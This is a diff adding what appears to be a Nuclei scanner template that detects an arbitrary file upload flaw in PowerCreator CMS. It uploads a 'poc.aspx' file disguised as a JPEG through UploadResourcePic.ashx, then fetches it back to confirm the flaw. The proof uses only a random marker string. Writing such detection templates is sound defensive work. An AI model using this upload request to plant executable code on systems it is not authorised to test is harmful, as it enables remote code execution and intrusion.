@@ -1,0 +1,45 @@
+id: powercreator-cms-rce
+
+info:
+  name: PowerCreator CMS RCE
+  author: pikpikcu
+  severity: critical
+  reference: https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/
+  tags: rce,powercreator
+
+requests:
+  - raw:
+      - |
+        POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Length: 225
+        Content-Disposition: form-data;name="file1";filename="poc.aspx";
+        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+
+        -----------------------------20873900192357278038549710136
+        Content-Disposition: form-data; name="file1"; filename="poc.aspx"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        -----------------------------20873900192357278038549710136--
+
+      - |
+        GET /ResourcePic/{{endpoint}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+
+    extractors:
+      - type: regex
+        name: endpoint
+        internal: true
+        part: body
+        regex:
+          - "(.*?.ASPX)"
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, '{{randstr}}') && status_code_2 == 200"
